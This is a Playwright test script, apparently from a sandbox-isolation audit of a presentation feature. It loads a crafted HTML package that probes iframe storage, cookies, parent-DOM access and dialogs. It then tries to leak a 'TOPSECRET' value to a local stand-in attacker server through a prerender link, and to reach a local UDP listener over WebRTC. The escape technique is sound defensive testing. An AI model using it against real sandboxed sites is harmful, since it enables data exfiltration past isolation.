// V1.3 part B: non-CSP-violating probes (readable) + webrtc + prerender escapes.
const fs=require('node:fs'),path=require('node:path');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const E='http://localhost:4661', UDP_IP='127.0.0.1', UDP_PORT=4663;
const html=`<!doctype html><html><body><h1>iso</h1><script>
window.__p={};const T=(k,f)=>{try{const v=f();if(v&&v.then){return v.then(x=>window.__p[k]='RESOLVED:'+String(x).slice(0,50)).catch(e=>window.__p[k]='rej:'+(e.name||e))}window.__p[k]='VAL:'+String(v).slice(0,50)}catch(e){window.__p[k]='BLOCKED/throw:'+(e.name||e.message||e).slice(0,60)}};
T('1_localStorage_native',()=>{localStorage.setItem('x','y');return 'wrote,len='+localStorage.length+',read='+localStorage.getItem('x')});
T('2_indexedDB_qft',()=>{const r=indexedDB.open('qft-markdown');return 'open-returned (async)'});
T('3_cookie_read',()=>document.cookie);
T('4_cookie_write',()=>{document.cookie='a=1';return 'after='+JSON.stringify(document.cookie)});
T('5_top_dom',()=>top.document.body.innerHTML.length);
T('6_parent_dom',()=>parent.document.title);
T('7_window_open',()=>{const w=window.open('${E}/popup','_blank');return 'ret='+(w===null?'null':typeof w)});
T('8_alert',()=>{alert('hi');return 'alert-returned'});
T('9_confirm',()=>'confirm='+confirm('ok?'));
T('10_fullscreen',()=>{document.documentElement.requestFullscreen();return 'called'});
T('11_cacheStorage',()=>typeof caches==='undefined'?'caches undefined':(caches.open('c'),'caches present'));
T('12_history_pushState',()=>{history.pushState({},'','/x');return 'pushed'});
T('ESCAPE_prerender',()=>{const l=document.createElement('link');l.rel='prerender';l.href='${E}/ESCAPE-prerender?secret=TOPSECRET';document.head.append(l);return 'appended'});
T('ESCAPE_webrtc',()=>{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:${UDP_IP}:${UDP_PORT}'}]});pc.createDataChannel('c');pc.createOffer().then(o=>pc.setLocalDescription(o));return 'started'});
setTimeout(()=>{window.__done=true},2000);
</script></body></html>`;
(async()=>{
 const site=await L.startSite(4660); const evil=await L.startEvil(4661); const udp=await L.startUdp(UDP_PORT);
 const out={}; let browser;
 try{
  browser=await chromium.launch({channel:'chromium'});
  const page=await (await browser.newContext()).newPage();
  const dialogs=[]; page.on('dialog',async d=>{dialogs.push(d.type()+':'+d.message());await d.dismiss()});
  const popups=[]; page.on('popup',p=>popups.push(p.url()));
  await L.openWorkspace(page,'http://127.0.0.1:4660/');
  await L.openFile(page,L.makePackage(html),'iso.zip');
  await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
  await page.locator('[data-pres-start-button]').click();
  await L.sleep(3500);
  const frame=L.appFrame(page); const s=await L.dialogState(page);
  out.hostStatus=s.status; out.frameAlive=!!frame;
  out.probes=frame?await frame.evaluate(()=>window.__p).catch(()=>'err'):'no-frame';
  out.attackerHTTP=evil.log.map(e=>`${e.method} ${e.url}`);
  out.stunDatagrams=udp.log.length;
  out.dialogsSeenByHost=dialogs; out.popups=popups;
 } finally { if(browser)await browser.close(); await Promise.all([site.close(),evil.close(),udp.close()]); fs.writeFileSync(path.join(__dirname,'logs','v-isolation2.json'),JSON.stringify(out,null,2)); }
 console.log(JSON.stringify(out,null,1));
})().catch(e=>{console.error(e);process.exit(1)});
